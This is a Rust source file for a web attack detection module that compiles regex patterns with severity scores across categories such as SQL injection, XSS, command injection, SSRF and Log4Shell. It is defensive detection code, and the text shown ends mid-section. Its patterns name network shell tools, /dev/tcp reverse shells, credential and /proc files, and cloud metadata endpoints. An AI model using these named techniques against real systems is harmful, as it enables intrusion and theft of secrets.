//! Web Attack Detection Module
//!
//! Provides multi-category web attack pattern detection using RegexSet
//! (Aho-Corasick based, O(n) across all patterns simultaneously).
//!
//! Categories:
//! - SQL Injection (25+ patterns)
//! - XSS (30+ patterns)
//! - Path Traversal (10+ patterns)
//! - Command Injection (15+ patterns)
//! - XXE (5+ patterns)
//! - SSRF (10+ patterns)
//! - SSTI (5+ patterns)
//! - NoSQL Injection (5+ patterns)
//! - Log4Shell (3 patterns)
//! - Open Redirect (3 patterns)
//! - Prototype Pollution (3 patterns)
//! - LDAP Injection (3 patterns)
//! - JWT Attack (4 patterns)
//! - HTTP Smuggling (4 patterns)
//! - Cache Poisoning (3 patterns)
//! - GraphQL Attack (4 patterns)
//! - CRLF Injection (3 patterns)
//! - Host Header Attack (2 patterns)
//! - CSP Bypass (3 patterns)
//! - CORS Attack (2 patterns)
//! - WebSocket Attack (2 patterns)
//! - DNS Rebinding (2 patterns)
//! - File Upload Attack (3 patterns)

use regex::RegexSet;
use once_cell::sync::Lazy;
use std::collections::HashSet;

/// Categories of web attacks
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum WebAttackCategory {
    SqlInjection,
    Xss,
    PathTraversal,
    CommandInjection,
    Xxe,
    Ssrf,
    Ssti,
    NoSqlInjection,
    Log4Shell,
    OpenRedirect,
    PrototypePollution,
    LdapInjection,
    JwtAttack,
    HttpSmuggling,
    CachePoisoning,
    GraphqlAttack,
    CrlfInjection,
    HostHeaderAttack,
    CspBypass,
    CorsAttack,
    WebsocketAttack,
    DnsRebinding,
    FileUploadAttack,
}

impl std::fmt::Display for WebAttackCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SqlInjection => write!(f, "sql_injection"),
            Self::Xss => write!(f, "xss"),
            Self::PathTraversal => write!(f, "path_traversal"),
            Self::CommandInjection => write!(f, "command_injection"),
            Self::Xxe => write!(f, "xxe"),
            Self::Ssrf => write!(f, "ssrf"),
            Self::Ssti => write!(f, "ssti"),
            Self::NoSqlInjection => write!(f, "nosql_injection"),
            Self::Log4Shell => write!(f, "log4shell"),
            Self::OpenRedirect => write!(f, "open_redirect"),
            Self::PrototypePollution => write!(f, "prototype_pollution"),
            Self::LdapInjection => write!(f, "ldap_injection"),
            Self::JwtAttack => write!(f, "jwt_attack"),
            Self::HttpSmuggling => write!(f, "http_smuggling"),
            Self::CachePoisoning => write!(f, "cache_poisoning"),
            Self::GraphqlAttack => write!(f, "graphql_attack"),
            Self::CrlfInjection => write!(f, "crlf_injection"),
            Self::HostHeaderAttack => write!(f, "host_header_attack"),
            Self::CspBypass => write!(f, "csp_bypass"),
            Self::CorsAttack => write!(f, "cors_attack"),
            Self::WebsocketAttack => write!(f, "websocket_attack"),
            Self::DnsRebinding => write!(f, "dns_rebinding"),
            Self::FileUploadAttack => write!(f, "file_upload_attack"),
        }
    }
}

/// A detected web attack
#[derive(Debug, Clone)]
pub struct WebAttack {
    /// Category of the attack
    pub category: WebAttackCategory,
    /// Severity score (0.0 - 1.0)
    pub severity: f64,
    /// Pattern index that matched
    pub pattern_index: usize,
}

impl WebAttack {
    /// Convert to a RiskFlag
    pub fn to_risk_flag(&self) -> sentinel_core::RiskFlag {
        match self.category {
            WebAttackCategory::SqlInjection => sentinel_core::RiskFlag::WebSqlInjection,
            WebAttackCategory::Xss => sentinel_core::RiskFlag::WebXss,
            WebAttackCategory::PathTraversal => sentinel_core::RiskFlag::WebPathTraversal,
            WebAttackCategory::CommandInjection => sentinel_core::RiskFlag::WebCommandInjection,
            WebAttackCategory::Xxe => sentinel_core::RiskFlag::WebXxe,
            WebAttackCategory::Ssrf => sentinel_core::RiskFlag::WebSsrf,
            WebAttackCategory::Ssti => sentinel_core::RiskFlag::WebSsti,
            WebAttackCategory::NoSqlInjection => sentinel_core::RiskFlag::WebNoSqlInjection,
            WebAttackCategory::Log4Shell => sentinel_core::RiskFlag::WebLog4Shell,
            WebAttackCategory::OpenRedirect => sentinel_core::RiskFlag::WebOpenRedirect,
            WebAttackCategory::PrototypePollution => sentinel_core::RiskFlag::WebPrototypePollution,
            WebAttackCategory::LdapInjection => sentinel_core::RiskFlag::WebLdapInjection,
            WebAttackCategory::JwtAttack => sentinel_core::RiskFlag::WebJwtAttack,
            WebAttackCategory::HttpSmuggling => sentinel_core::RiskFlag::WebHttpSmuggling,
            WebAttackCategory::CachePoisoning => sentinel_core::RiskFlag::WebCachePoisoning,
            WebAttackCategory::GraphqlAttack => sentinel_core::RiskFlag::WebGraphqlAttack,
            WebAttackCategory::CrlfInjection => sentinel_core::RiskFlag::WebCrlfInjection,
            WebAttackCategory::HostHeaderAttack => sentinel_core::RiskFlag::WebHostHeaderAttack,
            WebAttackCategory::CspBypass => sentinel_core::RiskFlag::WebCspBypass,
            WebAttackCategory::CorsAttack => sentinel_core::RiskFlag::WebCorsAttack,
            WebAttackCategory::WebsocketAttack => sentinel_core::RiskFlag::WebWebsocketAttack,
            WebAttackCategory::DnsRebinding => sentinel_core::RiskFlag::WebDnsRebinding,
            WebAttackCategory::FileUploadAttack => sentinel_core::RiskFlag::WebFileUploadAttack,
        }
    }

    /// Get the severity score for risk calculation
    pub fn severity_score(&self) -> f64 {
        self.severity
    }
}

/// Pattern entry mapping a regex index to its category and severity
struct PatternEntry {
    category: WebAttackCategory,
    severity: f64,
}

/// Disabled categories via SENTINEL_DISABLE_WEB_PATTERNS env var
static DISABLED_CATEGORIES: Lazy<HashSet<String>> = Lazy::new(|| {
    std::env::var("SENTINEL_DISABLE_WEB_PATTERNS")
        .unwrap_or_default()
        .split(',')
        .map(|s| s.trim().to_lowercase())
        .filter(|s| !s.is_empty())
        .collect()
});

/// All patterns with their category mappings, compiled into a single RegexSet
static WEB_ATTACK_PATTERNS: Lazy<(RegexSet, Vec<PatternEntry>)> = Lazy::new(|| {
    let mut patterns: Vec<&str> = Vec::new();
    let mut entries: Vec<PatternEntry> = Vec::new();

    // Helper macro to add patterns with category and severity
    macro_rules! add_pattern {
        ($pat:expr, $cat:expr, $sev:expr) => {
            patterns.push($pat);
            entries.push(PatternEntry { category: $cat, severity: $sev });
        };
    }

    // ─── SQL Injection (25+ patterns) ────────────────────────────────────────

    // UNION-based
    add_pattern!(r"(?i)UNION\s+(ALL\s+)?SELECT", WebAttackCategory::SqlInjection, 0.9);
    add_pattern!(r"(?i)UNION\s+SELECT\s+NULL", WebAttackCategory::SqlInjection, 0.95);

    // Error-based
    add_pattern!(r"(?i)EXTRACTVALUE\s*\(", WebAttackCategory::SqlInjection, 0.9);
    add_pattern!(r"(?i)UPDATEXML\s*\(", WebAttackCategory::SqlInjection, 0.9);
    add_pattern!(r"(?i)XMLTYPE\s*\(", WebAttackCategory::SqlInjection, 0.85);

    // Boolean blind
    add_pattern!(r"(?i)\bAND\s+\d+\s*=\s*\d+", WebAttackCategory::SqlInjection, 0.7);
    add_pattern!(r"(?i)\bOR\s+\d+\s*=\s*\d+", WebAttackCategory::SqlInjection, 0.7);
    add_pattern!(r"(?i)\bOR\s+'[^']*'\s*=\s*'[^']*'", WebAttackCategory::SqlInjection, 0.8);

    // Time blind
    add_pattern!(r"(?i)SLEEP\s*\(\s*\d+\s*\)", WebAttackCategory::SqlInjection, 0.9);
    add_pattern!(r"(?i)WAITFOR\s+DELAY", WebAttackCategory::SqlInjection, 0.9);
    add_pattern!(r"(?i)BENCHMARK\s*\(", WebAttackCategory::SqlInjection, 0.9);

    // Stacked queries
    add_pattern!(r"(?i);\s*(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|EXEC)\b", WebAttackCategory::SqlInjection, 0.85);

    // Comment evasion
    add_pattern!(r"(?i)/\*!\d+", WebAttackCategory::SqlInjection, 0.8);

    // Metadata access
    add_pattern!(r"(?i)INFORMATION_SCHEMA", WebAttackCategory::SqlInjection, 0.85);
    add_pattern!(r"(?i)pg_catalog", WebAttackCategory::SqlInjection, 0.85);
    add_pattern!(r"(?i)sqlite_master", WebAttackCategory::SqlInjection, 0.85);
    add_pattern!(r"(?i)sys\.tables", WebAttackCategory::SqlInjection, 0.85);

    // Functions
    add_pattern!(r"(?i)CHAR\s*\(\s*\d+\s*\)", WebAttackCategory::SqlInjection, 0.7);
    add_pattern!(r"(?i)CONCAT\s*\(", WebAttackCategory::SqlInjection, 0.5);
    add_pattern!(r"(?i)GROUP_CONCAT\s*\(", WebAttackCategory::SqlInjection, 0.8);
    add_pattern!(r"(?i)LOAD_FILE\s*\(", WebAttackCategory::SqlInjection, 0.95);

    // PostgreSQL specific
    add_pattern!(r"(?i)PG_SLEEP\s*\(", WebAttackCategory::SqlInjection, 0.9);
    add_pattern!(r"(?i)COPY\s+.*\s+TO\b", WebAttackCategory::SqlInjection, 0.9);
    add_pattern!(r"(?i)lo_export\s*\(", WebAttackCategory::SqlInjection, 0.95);

    // Combined keyword pairs
    add_pattern!(r"(?i)\b(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|EXEC|EXECUTE)\b.*\b(FROM|INTO|TABLE|DATABASE|WHERE|SET|VALUES)\b", WebAttackCategory::SqlInjection, 0.7);
    add_pattern!(r"(?i)'\s*--", WebAttackCategory::SqlInjection, 0.6);

    // ─── XSS (30+ patterns) ─────────────────────────────────────────────────

    // Tag-based
    add_pattern!(r"(?i)<script\b", WebAttackCategory::Xss, 0.95);
    add_pattern!(r"(?i)<img\s+[^>]*\bon\w+\s*=", WebAttackCategory::Xss, 0.9);
    add_pattern!(r"(?i)<svg\s+[^>]*\bon\w+\s*=", WebAttackCategory::Xss, 0.9);
    add_pattern!(r"(?i)<svg\s+[^>]*\bonload\s*=", WebAttackCategory::Xss, 0.95);
    add_pattern!(r"(?i)<body\s+[^>]*\bon\w+\s*=", WebAttackCategory::Xss, 0.9);
    add_pattern!(r"(?i)<iframe\b", WebAttackCategory::Xss, 0.85);
    add_pattern!(r"(?i)<object\b[^>]*\bdata\s*=", WebAttackCategory::Xss, 0.85);
    add_pattern!(r"(?i)<embed\b", WebAttackCategory::Xss, 0.85);
    add_pattern!(r"(?i)<form\s+[^>]*\baction\s*=", WebAttackCategory::Xss, 0.6);
    add_pattern!(r"(?i)<input\s+[^>]*\bon\w+\s*=", WebAttackCategory::Xss, 0.85);
    add_pattern!(r"(?i)<details\s+[^>]*\bon\w+\s*=", WebAttackCategory::Xss, 0.85);
    add_pattern!(r"(?i)<video\s+[^>]*\bon\w+\s*=", WebAttackCategory::Xss, 0.85);
    add_pattern!(r"(?i)<audio\s+[^>]*\bon\w+\s*=", WebAttackCategory::Xss, 0.85);
    add_pattern!(r"(?i)<marquee\s+[^>]*\bon\w+\s*=", WebAttackCategory::Xss, 0.85);
    add_pattern!(r"(?i)<math\s+[^>]*\bon\w+\s*=", WebAttackCategory::Xss, 0.85);

    // Event handlers (standalone)
    add_pattern!(r"(?i)\bon(load|error|click|mouseover|focus|blur|submit|change|input)\s*=", WebAttackCategory::Xss, 0.8);

    // Protocol handlers
    add_pattern!(r"(?i)javascript\s*:", WebAttackCategory::Xss, 0.95);
    add_pattern!(r"(?i)vbscript\s*:", WebAttackCategory::Xss, 0.95);
    add_pattern!(r"(?i)data\s*:\s*text/html", WebAttackCategory::Xss, 0.9);
    add_pattern!(r"(?i)data\s*:\s*application/x-javascript", WebAttackCategory::Xss, 0.95);

    // CSS-based
    add_pattern!(r"(?i)expression\s*\(", WebAttackCategory::Xss, 0.8);
    add_pattern!(r"(?i)@import\s+", WebAttackCategory::Xss, 0.5);

    // DOM-based
    add_pattern!(r"(?i)document\.(cookie|location|write|domain)", WebAttackCategory::Xss, 0.85);
    add_pattern!(r"(?i)window\.(location|open)\s*[=(]", WebAttackCategory::Xss, 0.8);
    add_pattern!(r"(?i)\beval\s*\(", WebAttackCategory::Xss, 0.85);
    add_pattern!(r#"(?i)setTimeout\s*\(\s*['"\\]"#, WebAttackCategory::Xss, 0.8);
    add_pattern!(r#"(?i)setInterval\s*\(\s*['"\\]"#, WebAttackCategory::Xss, 0.8);
    add_pattern!(r"(?i)\bFunction\s*\(", WebAttackCategory::Xss, 0.85);

    // Encoding evasion indicators
    add_pattern!(r"&#x?[0-9a-fA-F]{2,6};", WebAttackCategory::Xss, 0.5);
    add_pattern!(r"(?i)\\x[0-9a-fA-F]{2}", WebAttackCategory::Xss, 0.5);

    // ─── Path Traversal (10+ patterns) ───────────────────────────────────────

    add_pattern!(r"\.\./", WebAttackCategory::PathTraversal, 0.7);
    add_pattern!(r"\.\.\\", WebAttackCategory::PathTraversal, 0.7);
    add_pattern!(r"(?i)%2e%2e[/\\%]", WebAttackCategory::PathTraversal, 0.8);
    add_pattern!(r"(?i)%252e%252e", WebAttackCategory::PathTraversal, 0.9);
    add_pattern!(r"%00", WebAttackCategory::PathTraversal, 0.8);
    add_pattern!(r"/etc/passwd", WebAttackCategory::PathTraversal, 0.95);
    add_pattern!(r"/etc/shadow", WebAttackCategory::PathTraversal, 0.95);
    add_pattern!(r"(?i)C:\\\\Windows", WebAttackCategory::PathTraversal, 0.9);
    add_pattern!(r"(?i)C:\\\\boot\.ini", WebAttackCategory::PathTraversal, 0.9);
    add_pattern!(r"(?i)php://filter", WebAttackCategory::PathTraversal, 0.9);
    add_pattern!(r"(?i)php://input", WebAttackCategory::PathTraversal, 0.9);
    add_pattern!(r"(?i)expect://", WebAttackCategory::PathTraversal, 0.9);

    // ─── Command Injection (15+ patterns) ────────────────────────────────────

    add_pattern!(r"(?i);\s*\b(cat|ls|pwd|whoami|id|uname|curl|wget|nc|bash|sh|python|perl|ruby|php)\b", WebAttackCategory::CommandInjection, 0.9);
    add_pattern!(r"(?i)\|\s*\b(cat|ls|pwd|whoami|id|uname|curl|wget|nc|bash|sh)\b", WebAttackCategory::CommandInjection, 0.9);
    add_pattern!(r"`[^`]+`", WebAttackCategory::CommandInjection, 0.7);
    add_pattern!(r"\$\([^)]+\)", WebAttackCategory::CommandInjection, 0.7);
    add_pattern!(r"(?i)\b(Invoke-Expression|IEX|Invoke-WebRequest)\b", WebAttackCategory::CommandInjection, 0.9);
    add_pattern!(r"(?i)\b(system|exec|passthru|popen|proc_open|shell_exec)\s*\(", WebAttackCategory::CommandInjection, 0.9);
    add_pattern!(r"(?i)&&\s*\b(cat|ls|pwd|whoami|id|uname|curl|wget|nc|bash|sh)\b", WebAttackCategory::CommandInjection, 0.9);
    add_pattern!(r"(?i)\|\|\s*\b(cat|ls|pwd|whoami|id|uname|curl|wget)\b", WebAttackCategory::CommandInjection, 0.85);

    // ─── XXE (5+ patterns) ──────────────────────────────────────────────────

    add_pattern!(r"(?i)<!ENTITY\s", WebAttackCategory::Xxe, 0.95);
    add_pattern!(r"(?i)<!DOCTYPE\s[^>]*\bSYSTEM\b", WebAttackCategory::Xxe, 0.9);
    add_pattern!(r"(?i)<!DOCTYPE\s[^>]*\bPUBLIC\b", WebAttackCategory::Xxe, 0.8);
    add_pattern!(r"(?i)xmlns:\w+=.*file://", WebAttackCategory::Xxe, 0.9);
    add_pattern!(r"(?i)<\?xml\b[^>]*\bencoding\b[^>]*\?>.*<!DOCTYPE", WebAttackCategory::Xxe, 0.85);

    // ─── SSRF (10+ patterns) ────────────────────────────────────────────────

    add_pattern!(r"(?i)\b(?:file|gopher|dict|ldap|tftp)://", WebAttackCategory::Ssrf, 0.9);
    add_pattern!(r"(?i)\b127\.0\.0\.1\b", WebAttackCategory::Ssrf, 0.6);
    add_pattern!(r"(?i)\b0\.0\.0\.0\b", WebAttackCategory::Ssrf, 0.7);
    add_pattern!(r"(?i)\blocalhost\b(?::\d+)?(?:/|$)", WebAttackCategory::Ssrf, 0.6);
    add_pattern!(r"\b::1\b", WebAttackCategory::Ssrf, 0.6);
    add_pattern!(r"\b169\.254\.169\.254\b", WebAttackCategory::Ssrf, 0.95);
    add_pattern!(r"(?i)metadata\.google\.internal", WebAttackCategory::Ssrf, 0.95);
    add_pattern!(r"(?i)metadata\.azure\b", WebAttackCategory::Ssrf, 0.95);
    add_pattern!(r"(?i)/latest/meta-data", WebAttackCategory::Ssrf, 0.95);
    add_pattern!(r"(?i)/latest/api/token", WebAttackCategory::Ssrf, 0.95);
    add_pattern!(r"\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", WebAttackCategory::Ssrf, 0.4);
    add_pattern!(r"\b172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}\b", WebAttackCategory::Ssrf, 0.4);
    add_pattern!(r"\b192\.168\.\d{1,3}\.\d{1,3}\b", WebAttackCategory::Ssrf, 0.4);

    // ─── SSTI (5+ patterns) ─────────────────────────────────────────────────

    add_pattern!(r"\{\{.*\}\}", WebAttackCategory::Ssti, 0.5);
    add_pattern!(r"(?i)\$\{[^}]*\b(Runtime|Process|getClass|exec|java)\b", WebAttackCategory::Ssti, 0.95);
    add_pattern!(r"\{%.*%\}", WebAttackCategory::Ssti, 0.7);
    add_pattern!(r"#\{.*\}", WebAttackCategory::Ssti, 0.5);
    add_pattern!(r"<%.*%>", WebAttackCategory::Ssti, 0.7);
    add_pattern!(r"(?i)\{\{[^}]*\b(config|self|request|lipsum|cycler|joiner|namespace)\b", WebAttackCategory::Ssti, 0.85);

    // ─── NoSQL Injection (5+ patterns) ──────────────────────────────────────

    add_pattern!(r#"(?i)\{\s*"\$(?:ne|eq|gt|gte|lt|lte|in|nin|regex|where|exists|type|or|and|not|nor|elemMatch|size|all|mod|text|expr)"\s*:"#, WebAttackCategory::NoSqlInjection, 0.85);
    add_pattern!(r"(?i)\$(?:ne|gt|lt|regex|where|exists)\b", WebAttackCategory::NoSqlInjection, 0.7);
    add_pattern!(r#"(?i)\$where\s*:\s*['\"]"#, WebAttackCategory::NoSqlInjection, 0.9);
    add_pattern!(r"(?i)\bdb\.\w+\.(find|insert|update|delete|drop|aggregate)\s*\(", WebAttackCategory::NoSqlInjection, 0.85);

    // ─── Log4Shell (3 patterns) ─────────────────────────────────────────────

    add_pattern!(r"(?i)\$\{jndi:", WebAttackCategory::Log4Shell, 1.0);
    add_pattern!(r"(?i)\$\{env:", WebAttackCategory::Log4Shell, 0.8);
    add_pattern!(r"(?i)\$\{sys:", WebAttackCategory::Log4Shell, 0.8);

    // ─── Open Redirect (3 patterns) ─────────────────────────────────────────

    add_pattern!(r"(?i)(?:redirect|return|next|url|goto|dest|target|rurl|redir)_?(?:url|uri|to|path)?\s*=\s*(?:https?://|//)[^/]", WebAttackCategory::OpenRedirect, 0.6);
    add_pattern!(r"//[^/]+@", WebAttackCategory::OpenRedirect, 0.5);
    add_pattern!(r"(?i)(?:redirect|url|next)\s*=\s*\\\\[^\\]", WebAttackCategory::OpenRedirect, 0.6);

    // ─── Prototype Pollution (3 patterns) ────────────────────────────────────

    add_pattern!(r"__proto__", WebAttackCategory::PrototypePollution, 0.9);
    add_pattern!(r#"(?i)constructor\s*\[\s*['\"]prototype['\"]"#, WebAttackCategory::PrototypePollution, 0.9);
    add_pattern!(r"(?i)constructor\.prototype", WebAttackCategory::PrototypePollution, 0.9);

    // ─── LDAP Injection (3+ patterns) ────────────────────────────────────────

    add_pattern!(r"\)\s*\([|&!]", WebAttackCategory::LdapInjection, 0.8);
    add_pattern!(r"\*\)\s*\(", WebAttackCategory::LdapInjection, 0.7);
    add_pattern!(r"(?i)objectClass\s*=\s*\*", WebAttackCategory::LdapInjection, 0.8);

    // ─── JWT Attack (4 patterns) ─────────────────────────────────────────────

    // JWT token in input (base64url-encoded header.payload pattern)
    add_pattern!(r"(?i)eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}", WebAttackCategory::JwtAttack, 0.5);
    // JWT none algorithm bypass — critical: allows forging tokens without signing
    // F-fix 2026-06-02: accetta ottionale quote dopo "alg" (JSON: "alg":"none")
    add_pattern!(r#"(?i)\balg\b['"]?\s*:\s*['"]none['"]"#, WebAttackCategory::JwtAttack, 0.95);
    // JWT secret/key exposure in input
    add_pattern!(r"(?i)jwt[_-]?secret|jwt[_-]?key|jwt[_-]?private", WebAttackCategory::JwtAttack, 0.9);
    // JWT header manipulation (crafted JSON header)
    add_pattern!(r#"(?i)\{\s*"alg"\s*:\s*"HS256"\s*,\s*"typ"\s*:\s*"JWT""#, WebAttackCategory::JwtAttack, 0.6);

    // ─── HTTP Smuggling (4 patterns) ─────────────────────────────────────────

    // CL+TE smuggling — Content-Length before Transfer-Encoding.
    // (?s) = dotall: `.` matches anche \r\n (necessario per HTTP headers multi-line)
    add_pattern!(r"(?is)Transfer-Encoding\s*:\s*chunked.*Content-Length", WebAttackCategory::HttpSmuggling, 0.95);
    // TE+CL smuggling — Transfer-Encoding before Content-Length
    add_pattern!(r"(?is)Content-Length\s*:\s*\d+.*Transfer-Encoding\s*:\s*chunked", WebAttackCategory::HttpSmuggling, 0.95);
    // Double Transfer-Encoding header
    add_pattern!(r"(?i)Transfer-Encoding\s*:\s*(?:identity|chunked)\s*,\s*(?:identity|chunked)", WebAttackCategory::HttpSmuggling, 0.9);
    // Embedded HTTP request after double CRLF
    add_pattern!(r"(?s)\r\n\s*\r\n.*(?:GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+/", WebAttackCategory::HttpSmuggling, 0.85);

    // ─── Cache Poisoning (3 patterns) ────────────────────────────────────────

    // Cache key manipulation via non-standard headers
    add_pattern!(r"(?i)X-(?:Forwarded-Host|Original-URL|Rewrite-URL|Custom-IP-Authorization)\s*:", WebAttackCategory::CachePoisoning, 0.7);
    // Protocol override to inject non-HTTPS schemes
    add_pattern!(r"(?i)X-Forwarded-(?:Scheme|Proto)\s*:\s*(?:nothttps|javascript|data)", WebAttackCategory::CachePoisoning, 0.8);
    // Response splitting via header injection with double newlines
    add_pattern!(r"(?i)(?:Pragma|Age|X-Cache)\s*:.*(?:\r?\n){2,}", WebAttackCategory::CachePoisoning, 0.85);

    // ─── GraphQL Attack (4 patterns) ─────────────────────────────────────────

    // GraphQL introspection query — schema enumeration
    add_pattern!(r"(?i)\b__schema\b", WebAttackCategory::GraphqlAttack, 0.6);
    // GraphQL type introspection — field enumeration
    add_pattern!(r"(?i)\b__type\b\s*\{", WebAttackCategory::GraphqlAttack, 0.6);
    // Deep nesting DoS (5+ levels of brace nesting)
    add_pattern!(r"(?i)\{\s*(?:query|mutation)\s*\{[^}]*\{[^}]*\{[^}]*\{[^}]*\{", WebAttackCategory::GraphqlAttack, 0.8);
    // Batched deep query with parameters
    add_pattern!(r"(?i)(?:query|mutation)\s+\w+\s*\([^)]*\)\s*\{(?:[^}]*\{){5,}", WebAttackCategory::GraphqlAttack, 0.85);

    // ─── CRLF Injection (3 patterns) ─────────────────────────────────────────

    // CRLF in URL (percent-encoded \r\n)
    add_pattern!(r"(?:%0[dD]|\\r)(?:%0[aA]|\\n)", WebAttackCategory::CrlfInjection, 0.85);
    // Header injection via CRLF — attacker injecting Set-Cookie, Location, etc.
    add_pattern!(r"(?i)\r\n(?:Set-Cookie|Location|X-)\s*:", WebAttackCategory::CrlfInjection, 0.9);
    // Double CRLF for HTTP response splitting
    add_pattern!(r"%0[dD]%0[aA]%0[dD]%0[aA]", WebAttackCategory::CrlfInjection, 0.95);

    // ─── Host Header Attack (2 patterns) ─────────────────────────────────────

    // Host header SSRF — internal hostnames in Host header
    add_pattern!(r"(?i)Host\s*:\s*(?:localhost|127\.0\.0\.1|0\.0\.0\.0|internal|evil)", WebAttackCategory::HostHeaderAttack, 0.8);
    // Host override via X-Forwarded-Host
    add_pattern!(r"(?i)X-Forwarded-Host\s*:\s*\S+\.\S+", WebAttackCategory::HostHeaderAttack, 0.5);

    // ─── CSP Bypass (3 patterns) ─────────────────────────────────────────────

    // Weak CSP directives (wildcard or unsafe keywords)
    add_pattern!(r#"(?i)(?:default|script|style|img|connect|frame|object)-src\s+['"]?(?:\*|unsafe-inline|unsafe-eval)"#, WebAttackCategory::CspBypass, 0.6);
    // Base tag hijacking — can redirect relative URLs
    add_pattern!(r"(?i)<base\s+[^>]*\bhref\s*=", WebAttackCategory::CspBypass, 0.8);
    // Resource preload abuse — prefetch/preconnect to exfiltrate data
    add_pattern!(r#"(?i)<link\s+[^>]*\brel\s*=\s*['"]?(?:preload|prefetch|preconnect)['"]?\s+[^>]*\bhref\s*="#, WebAttackCategory::CspBypass, 0.5);

    // ─── CORS Attack (2 patterns) ────────────────────────────────────────────

    // CORS null origin — exploits misconfigured Access-Control-Allow-Origin: null
    add_pattern!(r"(?i)Origin\s*:\s*(?:null|file://|chrome-extension://|moz-extension://)", WebAttackCategory::CorsAttack, 0.7);
    // Wildcard CORS — overly permissive cross-origin headers
    add_pattern!(r"(?i)Access-Control-(?:Allow-Origin|Allow-Credentials|Request-Headers)\s*:\s*\*", WebAttackCategory::CorsAttack, 0.6);

    // ─── WebSocket Attack (2 patterns) ───────────────────────────────────────

    // WebSocket injection — script/eval in WebSocket handshake headers
    add_pattern!(r"(?i)Sec-WebSocket-(?:Key|Version|Extensions)\s*:.*(?:eval|script|javascript)", WebAttackCategory::WebsocketAttack, 0.85);
    // WebSocket SQLi/XSS — SQL or XSS payload in WebSocket upgrade request
    add_pattern!(r"(?i)Upgrade\s*:\s*websocket.*(?:UNION|SELECT|<script)", WebAttackCategory::WebsocketAttack, 0.9);

    // ─── DNS Rebinding (2 patterns) ──────────────────────────────────────────

    // Known DNS rebinding services
    add_pattern!(r"(?i)(?:rebind|rbndr|1u\.ms|nip\.io|sslip\.io|xip\.io)", WebAttackCategory::DnsRebinding, 0.7);
    // IP-based DNS rebinding (e.g., 10.0.0.1.nip.io)
    add_pattern!(r"(?i)(?:\d{1,3}\.){3}\d{1,3}\.(?:nip\.io|sslip\.io|xip\.io)", WebAttackCategory::DnsRebinding, 0.75);

    // ─── File Upload Attack (3 patterns) ─────────────────────────────────────

    // Dangerous file extensions — server-side executable
    add_pattern!(r"(?i)\.(?:php[3-7s]?|phtml|phar|jsp[xf]?|asp[x]?|exe|dll|bat|cmd|sh|cgi)\b", WebAttackCategory::FileUploadAttack, 0.8);
    // PHP content type in upload — explicit server-side execution MIME
    add_pattern!(r"(?i)Content-Type\s*:\s*(?:application/x-php|text/x-php|application/x-httpd-php)", WebAttackCategory::FileUploadAttack, 0.85);
    // Polyglot file — image magic bytes followed by PHP opening tag
    add_pattern!(r"(?i)(?:GIF89a|GIF87a|\xff\xd8\xff|\x89PNG).*<\?(?:php|=)", WebAttackCategory::FileUploadAttack, 0.95);

    // ─── Additional SQL Injection (3 patterns) ────────────────────────────────

    // INTO OUTFILE / DUMPFILE — file write via SQL
    add_pattern!(r"(?i)\bINTO\s+(OUTFILE|DUMPFILE)\b", WebAttackCategory::SqlInjection, 0.95);
    // ORDER BY-based column enumeration
    add_pattern!(r"(?i)\bORDER\s+BY\s+\d{2,}", WebAttackCategory::SqlInjection, 0.7);
    // HAVING-based error injection
    add_pattern!(r"(?i)\bHAVING\s+\d+\s*=\s*\d+", WebAttackCategory::SqlInjection, 0.75);

    // ─── Additional XSS (3 patterns) ─────────────────────────────────────────

    // XSS via meta refresh redirect
    add_pattern!(r#"(?i)<meta\s+[^>]*\bhttp-equiv\s*=\s*['"]?refresh"#, WebAttackCategory::Xss, 0.8);
    // XSS via style attribute expression
    add_pattern!(r#"(?i)\bstyle\s*=\s*['"][^'"]*\bexpression\s*\("#, WebAttackCategory::Xss, 0.85);
    // XSS via template literals injection
    add_pattern!(r#"(?i)\$\{[^}]*(?:alert|confirm|prompt|document|window)\b"#, WebAttackCategory::Xss, 0.85);

    // ─── Additional Command Injection (2 patterns) ────────────────────────────

    // OS command via /dev/tcp (bash reverse shell)
    add_pattern!(r"(?i)/dev/(?:tcp|udp)/", WebAttackCategory::CommandInjection, 0.95);
    // Python/Ruby one-liner shell
    add_pattern!(r#"(?i)python[23]?\s+-c\s+['"]import"#, WebAttackCategory::CommandInjection, 0.9);

    // ─── Additional JWT Attack (1 pattern) ─────────────────────────────────────

    // JWT key confusion — using public key as HMAC secret
    add_pattern!(r#"(?i)\balg\b\s*:\s*['"](?:HS256|HS384|HS512)['"].*-----BEGIN\s+(?:RSA\s+)?PUBLIC\s+KEY"#, WebAttackCategory::JwtAttack, 0.95);

    // ─── Additional Host Header Attack (1 pattern) ─────────────────────────────

    // Host header port override — inject non-standard port
    add_pattern!(r"(?i)Host\s*:\s*[^:\r\n]+:\s*(?:[1-9]\d{4,}|0)\b", WebAttackCategory::HostHeaderAttack, 0.6);

    // ─── Additional CORS Attack (1 pattern) ────────────────────────────────────

    // CORS reflected origin — dynamic mirroring of origin header
    add_pattern!(r"(?i)Access-Control-Allow-Origin\s*:\s*(?:https?://[^\s,]+|null)\s*\r?\nAccess-Control-Allow-Credentials\s*:\s*true", WebAttackCategory::CorsAttack, 0.85);

    // ─── Additional SSRF (2 patterns) ──────────────────────────────────────────

    // AWS IMDSv2 token request header
    add_pattern!(r"(?i)X-aws-ec2-metadata-token", WebAttackCategory::Ssrf, 0.95);
    // SSRF via URL redirect chaining
    add_pattern!(r"(?i)url\s*=\s*(?:https?://)?(?:127|0x7f|2130706433|0177)", WebAttackCategory::Ssrf, 0.9);

    // ─── Additional Path Traversal (2 patterns) ────────────────────────────────

    // /proc filesystem access — Linux process information disclosure
    add_pattern!(r"/proc/(?:self|[0-9]+)/(?:environ|cmdline|fd|maps)", WebAttackCategory::PathTraversal, 0.95);
    // Windows UNC path traversal
    add_pattern!(r"(?i)\\\\[a-zA-Z0-9_.]+\\[a-zA-Z0-9$_]+", WebAttackCategory::PathTraversal, 0.8);

    // ─── Additional NoSQL Injection (1 pattern) ────────────────────────────────

    // MongoDB mapReduce injection — server-side JavaScript execution
